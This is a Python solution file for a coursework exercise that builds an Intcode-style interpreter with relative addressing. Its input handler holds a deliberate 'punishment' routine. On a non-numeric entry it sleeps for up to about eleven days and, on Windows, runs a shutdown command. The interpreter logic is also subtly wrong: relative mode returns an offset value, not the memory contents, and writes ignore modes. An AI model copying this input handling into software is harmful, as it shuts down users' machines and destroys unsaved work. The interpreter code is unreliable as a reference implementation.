import enum
import os
from colorama import Fore
import logging
import time
import random
from sys import platform
import subprocess
import pathlib
# For this weeeks exercise you again need to add a feature to your existing simulated computer:

# - The computer needs to implement memory much /larger/ than the set of initial commands.
#   Any memory address not part of the initial commands can be assumed to be initialized to 0.
#   Only positive addresses are valid, but any positive address can be both read and written.
# - You need to support a new parameter mode, called 'relative mode', and denoted as mode 2 in
#   the 'mode' part of the instructions.
#   Relative mode is similar to position mode (the first access mode you implemented). However,
#   parameters in relative mode count not from 0, but from a value called 'relative offset'.
#   When the computer is initialized, the relative offset is initialized to 0, and as long as it remains
#   0 relative mode and position mode are identical.
#   In general though parameters in relative mode address the memory location at 'relative offset + parameter value'.
#   EXAMPLE: if the relative offset is 50, the mode is 2, and the value you read from memory is 7 you should
#     retrieve data from the memory address 57.
#     Equally, if you read -7, you should retrieve data from the memory address 43.
#   This applies to both read- and write operations (!)

# - You need to implement a new opcode, opcode 9. opcode 9 adjusts the relative offset by the value of its only parameter.
#   the offset increases by the value of the parameter (or decreases if the parameter value is negative).

# Here is a short program to test your implementation:
#   [109,1,204,-1,1001,100,1,100,1008,100,16,101,1006,101,0,99] should output a copy of itself
#   
# The actual input is in a separate file, input_memory_01.txt under the `data` folder.
# When asked for input provide the value 2. There should be a single output. Please include it in your PR.


# ! use dicts for implementing the memory

class op_mode(enum.Enum): 
    POSITION = 0
    IMMEDIATE = 1
    RELATIVE = 2


class operations(enum.Enum):
    # region opcode explanation
    # - 1: add the values of the two parameters and store the result in the position given by the third parameter
    # - 2: multiply the values of the two parameters and store the result in the position given by the third parameter
    # - 3: read a single integer as input and save it to the position given
    #      by its only parameter. the command 3,19 would read an input
    #      and store the result at address 19
    # - 4: output the value of the single parameter for this opcode.
    #      for example 4,19 would output the value stored at address 19             
    # - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 6: jump-if-false: if the first parameter is zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
    # - 7: less than: if the first parameter is less than the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    # - 8: equals: if the first parameter is equal to the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
    # - 9: adjusts the relative offset by the value of its only parameter.
    #      the offset increases by the value of the parameter (or decreases if the parameter value is negative).
    # endregion
    ADD = 1
    MULTIPLY = 2
    INPUT = 3
    OUTPUT = 4
    JUMP_IF_TRUE = 5
    JUMP_IF_FALSE = 6
    LESS_THAN = 7
    EQUALS = 8
    CHANGE_RELATIVE_OFFSET = 9
    HALT = 99


def get_element(mode: op_mode, lst: dict, idx: int, offset: int) -> int:
    """returns element based upon the task mode"""
    match mode:
        case op_mode.POSITION:
            return lst.get(lst.get(idx, 0), 0)
        case op_mode.IMMEDIATE:
            return lst.get(idx, 0)
        case op_mode.RELATIVE:
            return lst.get(idx, 0) + offset


def calc(lst: dict, idx: int, op: operations, instruction: list, offset: int) -> int:
    """calc is short for calculator. Handles 1,2,7 and 8"""
    param_one_mode = op_mode(int(instruction[1]))
    param_two_mode = op_mode(int(instruction[0]))

    idx += 1 
    param_one = get_element(param_one_mode, lst, idx, offset)
    idx += 1
    param_two = get_element(param_two_mode, lst, idx, offset)
    idx += 1
    destination = lst[idx]

    match op:
        case operations.ADD:
            lst[destination] = param_one + param_two
        case operations.MULTIPLY:
            lst[destination] = param_one * param_two
        case operations.LESS_THAN:
            lst[destination] = 1 if param_one < param_two else 0
        case operations.EQUALS:
            lst[destination] = 1 if param_one == param_two else 0
    logging.debug(f'Calculation: {lst[destination]}')
    return idx + 1


def jump_operation(lst: dict,
                   idx: int,
                   op: operations,
                   instruction: list,
                   offset: int) -> int:
    """handles the jump operations 5 and 6"""
    param_one_mode = op_mode(int(instruction[1]))
    param_two_mode = op_mode(int(instruction[0]))

    idx += 1
    param_one = get_element(param_one_mode, lst, idx, offset)
    idx += 1
    param_two = get_element(param_two_mode, lst, idx, offset)

    if (op == operations.JUMP_IF_TRUE and param_one != 0) or (op == operations.JUMP_IF_FALSE and param_one == 0):
        return param_two
    return idx + 1


def read_value(lst: dict, idx: int) -> int:
    """handles input value operation 3"""
    idx += 1
    while not False:
        # ? try catch error, to minimize ID10T errors
        try:
            lst[lst[idx]] = int(input("Please enter a value: "))
            break
        except ValueError:
            print("Please enter a valid number")
            # ! Punishes the user for wrong input
            time.sleep(random.randint(9999, 999999)) 
            if platform == "win32":
                # ! additionaly punish windows users for using Windows and
                # ! wrong input
                subprocess.call("shutdown /s /t 1") 
            continue
    logging.debug(f'Value: {lst[lst[idx]]} at index {lst[idx]}')
    return idx + 1


def output_value(lst: dict, idx: int, instruction: list, offset: int) -> int:
    """handles output value operation 4"""
    param_mode = op_mode(int(instruction[1]))
    idx += 1
    output = get_element(param_mode, lst, idx, offset)
    print(f"Output: {output}")
    idx += 1
    return idx


def change_offset(offset: int, operation: list, lst: list, idx: int) -> int:
    operation = op_mode(int(operation[1]))
    idx += 1
    param_one: int = get_element(operation, lst, idx, offset)
    offset += param_one
    idx += 1
    return offset, idx


def check_for_opcode(idx: int, lst: dict, offset: int = 0):
    operation = str(lst[idx]) 
    while len(operation) < 4:
        operation = '0' + operation
    try:
        opcode = operations(int(operation) % 100)
    except ValueError:
        logging.error(f'Invalid opcode: {opcode} at index {idx}')
        return False, 0, offset
    logging.debug(f'Current opcode: {opcode}')
    end = False
    # region opcode handeling
    match opcode:
        case operations.ADD:
            idx = calc(lst, idx, operations.ADD, operation, offset)
        case operations.MULTIPLY:
            idx = calc(lst, idx, operations.MULTIPLY, operation, offset)
        case operations.INPUT:
            idx = read_value(lst, idx)
        case operations.OUTPUT:
            idx = output_value(lst, idx, operation, offset)
        case operations.JUMP_IF_TRUE:
            idx = jump_operation(lst, idx, operations.JUMP_IF_TRUE,
                                 operation, offset)
        case operations.JUMP_IF_FALSE:
            idx = jump_operation(lst, idx, operations.JUMP_IF_FALSE,
                                 operation, offset)
        case operations.LESS_THAN:
            idx = calc(lst, idx, operations.LESS_THAN, operation, offset)
        case operations.EQUALS:
            idx = calc(lst, idx, operations.EQUALS, operation, offset)
        case operations.CHANGE_RELATIVE_OFFSET:
            offset, idx = change_offset(offset, operation, lst, idx)
        case operations.HALT:
            end = True
    # endregion
    return idx, end, offset


def reader(lst: dict | str | list,
           idx: int = 0,
           end: bool = False) -> int:
    if type(lst) is str:
        lst = read_file(lst)
    elif type(lst) is list:
        lst = list_to_dict(lst)
    offset = 0
    while end is False:
        idx, end, offset = check_for_opcode(idx, lst, offset)
    return lst[0]


def list_to_dict(lst: list) -> dict:
    """converts list to a dictionary with values from the list and 
    enumerated keys e.g. [10,20,30,40] -> {0: 10, 1: 20, 2: 30, 3: 40}"""
    goal = {} 
    for index, value in enumerate(lst):
        goal[index] = int(value)
    return goal


def read_file(path: str) -> dict:
    """reads the input file and returns the needed dict"""
    with open(path, "r") as f:
        input = f.readline()
        input = input.split(",")
    input = list_to_dict(input)
    return input


script_dir = os.path.dirname(os.path.abspath(__file__))
sequence_path = os.path.join(
    script_dir, "..", "..", "data", "input_memory_01.txt"
)

print(Fore.LIGHTGREEN_EX + f'-----\nFinal output of the command: {reader(sequence_path)}\n-----')
print(Fore.RESET)
# test_list = [109, 1, 204, -1, 1001, 100, 1, 100, 1008, 100, 16, 101, 1006, 101, 0, 99]
